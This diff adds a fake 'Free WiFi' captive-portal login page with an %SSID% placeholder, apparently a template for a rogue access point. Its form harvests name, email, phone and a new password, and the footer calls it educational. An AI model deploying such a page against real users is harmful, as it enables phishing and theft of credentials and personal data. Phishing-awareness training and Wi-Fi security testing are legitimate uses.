@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to %SSID% Free WiFi</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); padding: 40px 30px; width: 100%; max-width: 420px; }
+    .wifi-icon { text-align: center; font-size: 48px; margin-bottom: 20px; }
+    h1 { text-align: center; font-size: 1.4rem; color: #333; margin-bottom: 5px; }
+    .ssid { color: #667eea; }
+    .subtitle { text-align: center; color: #888; font-size: 0.9rem; margin-bottom: 25px; }
+    .form-group { margin-bottom: 15px; }
+    label { display: block; font-size: 0.85rem; color: #555; margin-bottom: 5px; font-weight: 500; }
+    input { width: 100%; padding: 12px 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; transition: border-color 0.2s; }
+    input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.15); }
+    button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 10px; transition: transform 0.1s; }
+    button:active { transform: scale(0.98); }
+    .footer { text-align: center; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; font-size: 0.7rem; color: #aaa; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="wifi-icon">&#128246;</div>
+    <h1>Welcome to <span class="ssid">%SSID%</span> Free WiFi</h1>
+    <p class="subtitle">To continue, please register</p>
+    <form action="/" method="post">
+      <div class="form-group">
+        <label for="name">Full Name</label>
+        <input type="text" id="name" name="name" placeholder="John Doe" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="john@example.com" required>
+      </div>
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" placeholder="+351 912 345 678" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Create Password</label>
+        <input type="password" id="password" name="password" placeholder="Create a password" required>
+      </div>
+      <button type="submit">Connect</button>
+    </form>
+    <div class="footer">This is a fake page for educational purposes.</div>
+  </div>
+</body>
+</html>
